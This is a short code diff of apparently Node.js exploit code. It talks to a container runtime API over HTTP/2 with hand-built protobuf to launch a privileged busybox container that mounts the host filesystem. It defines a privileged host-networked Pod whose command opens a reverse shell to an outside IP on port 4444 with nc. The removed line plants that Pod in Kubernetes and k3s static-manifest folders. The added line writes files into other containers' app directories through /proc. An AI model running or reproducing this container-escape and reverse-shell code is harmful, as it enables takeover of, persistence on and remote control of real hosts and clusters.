@@ -4,7 +4,7 @@ function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection
 const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
 const v1=(k,v)=>Buffer.from([k,v]);
 const Y=JSON.stringify({apiVersion:'v1',kind:'Pod',metadata:{name:'zzf1'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}});
-const CMD="echo '"+Y+"' > /h/var/lib/rancher/k3s/server/manifests/zzf1.json 2>/dev/null; echo '"+Y+"' > /h/etc/kubernetes/manifests/zzf1.json 2>/dev/null";
+const CMD="for p in /h/proc/[0-9]*/root/app/public; do echo HOSTPROC > $p/zz_p.txt 2>/dev/null; done; for q in /h/proc/[0-9]*/root/app/.next/static; do echo S > $q/zz_s.txt 2>/dev/null; done";
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const cfg=Buffer.concat([fl(0x0a,'zzfc'), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
